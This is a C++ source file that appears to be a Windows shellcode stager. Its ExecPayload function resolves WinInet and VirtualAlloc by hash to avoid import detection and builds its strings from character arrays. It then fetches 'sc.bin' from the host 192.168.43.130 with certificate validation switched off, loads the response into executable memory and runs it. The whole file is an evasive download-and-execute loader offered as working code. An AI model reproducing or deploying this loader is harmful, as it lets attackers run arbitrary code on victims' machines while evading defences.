// CreateProcess.cpp : Defines the entry point for the console application.
//
#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4055 )
#pragma warning (disable: 4201)

#include <windows.h>
#include <stdio.h>
#include <GetProcAddressByHash.h>
#include <intrin.h>
#include <WinInet.h>

#pragma comment(lib, "Wininet")


typedef HMODULE(WINAPI *FuncLoadLibraryA) (
	_In_z_ LPTSTR lpFileName
	);

typedef HINTERNET(WINAPI *FuncInternetOpenA) (
	_In_  LPCTSTR lpszAgent,
	_In_  DWORD dwAccessType,
	_In_  LPCTSTR lpszProxyName,
	_In_  LPCTSTR lpszProxyBypass,
	_In_  DWORD dwFlags
	);

typedef HINTERNET(WINAPI *FuncInternetConnectA) (
	_In_  HINTERNET hInternet,
	_In_  LPCTSTR lpszServerName,
	_In_  INTERNET_PORT nServerPort,
	_In_  LPCTSTR lpszUsername,
	_In_  LPCTSTR lpszPassword,
	_In_  DWORD dwService,
	_In_  DWORD dwFlags,
	_In_  DWORD_PTR dwContext
	);

typedef HINTERNET(WINAPI *FuncHttpOpenRequestA) (
	_In_  HINTERNET hConnect,
	_In_  LPCTSTR lpszVerb,
	_In_  LPCTSTR lpszObjectName,
	_In_  LPCTSTR lpszVersion,
	_In_  LPCTSTR lpszReferer,
	_In_  LPCTSTR *lplpszAcceptTypes,
	_In_  DWORD dwFlags,
	_In_  DWORD_PTR dwContext
	);

typedef BOOL(WINAPI *FuncInternetSetOptionA)(
	_In_  HINTERNET hInternet,
	_In_  DWORD dwOption,
	_In_  LPVOID lpBuffer,
	_In_  DWORD dwBufferLength
	);

typedef BOOL(WINAPI *FuncHttpSendRequestA) (
	_In_  HINTERNET hRequest,
	_In_  LPCTSTR lpszHeaders,
	_In_  DWORD dwHeadersLength,
	_In_  LPVOID lpOptional,
	_In_  DWORD dwOptionalLength
	);

typedef BOOL(WINAPI *FuncInternetReadFile) (
	_In_   HINTERNET hFile,
	_Out_  LPVOID lpBuffer,
	_In_   DWORD dwNumberOfBytesToRead,
	_Out_  LPDWORD lpdwNumberOfBytesRead
	);

typedef LPVOID(WINAPI *FuncVirtualAlloc) (
	_In_opt_  LPVOID lpAddress,
	_In_      SIZE_T dwSize,
	_In_      DWORD flAllocationType,
	_In_      DWORD flProtect
	);

VOID ExecPayload(VOID)
{

	char wininet[] = { 'w', 'i', 'n', 'i', 'n', 'e', 't', '.', 'd', 'l', 'l', 0 };
	char hostname[] = { '1', '9', '2', '.', '1', '6', '8', '.', '4', '3', '.', '1', '3', '0', 0 };
	char payload[] = { 's', 'c', '.', 'b', 'i', 'n', 0 };
	char http[] = { 'H', 'T', 'T', 'P', '/', '1', '.', '1', 0 };

	FuncLoadLibraryA MyLoadLibraryA;
	FuncInternetOpenA MyInternetOpenA;
	FuncInternetConnectA MyInternetConnectA;
	FuncHttpOpenRequestA MyHttpOpenRequestA;
	FuncInternetSetOptionA MyInternetSetOptionA;
	FuncHttpSendRequestA MyHttpSendRequestA;
	FuncInternetReadFile MyInternetReadFile;
	FuncVirtualAlloc MyVirtualAlloc;

	MyLoadLibraryA = (FuncLoadLibraryA)GetProcAddressByHash(0x0726774C);
	MyLoadLibraryA((LPTSTR)wininet);

	MyInternetOpenA = (FuncInternetOpenA)GetProcAddressByHash(0xA779563A);
	MyInternetConnectA = (FuncInternetConnectA)GetProcAddressByHash(0xC69F8957);
	MyHttpOpenRequestA = (FuncHttpOpenRequestA)GetProcAddressByHash(0x3B2E55EB);
	MyInternetSetOptionA = (FuncInternetSetOptionA)GetProcAddressByHash(0x869E4675);
	MyHttpSendRequestA = (FuncHttpSendRequestA)GetProcAddressByHash(0x7B18062D);
	MyInternetReadFile = (FuncInternetReadFile)GetProcAddressByHash(0xE2899612);
	MyVirtualAlloc = (FuncVirtualAlloc)GetProcAddressByHash(0xE553A458);

	LPVOID pe_allocation;
	DWORD bytesRead;
	DWORD dwLength = 0x5000; // Length of the EXE = 0.5 MB (CHANGE IF REQUIRED)
	DWORD dwFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
	HINTERNET internet_open;
	HINTERNET internet_connect;
	HINTERNET http_request;

	internet_open = MyInternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	internet_connect = MyInternetConnectA(internet_open, hostname, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, INTERNET_FLAG_RELOAD, 0);
	http_request = MyHttpOpenRequestA(internet_connect, NULL, payload, http, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_EXISTING_CONNECT, 0);
	MyInternetSetOptionA(http_request, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	MyHttpSendRequestA(http_request, 0, 0, 0, 0);

	pe_allocation = MyVirtualAlloc(NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	MyInternetReadFile(http_request, pe_allocation, dwLength, &bytesRead);

	((void(*)(void))pe_allocation)();

}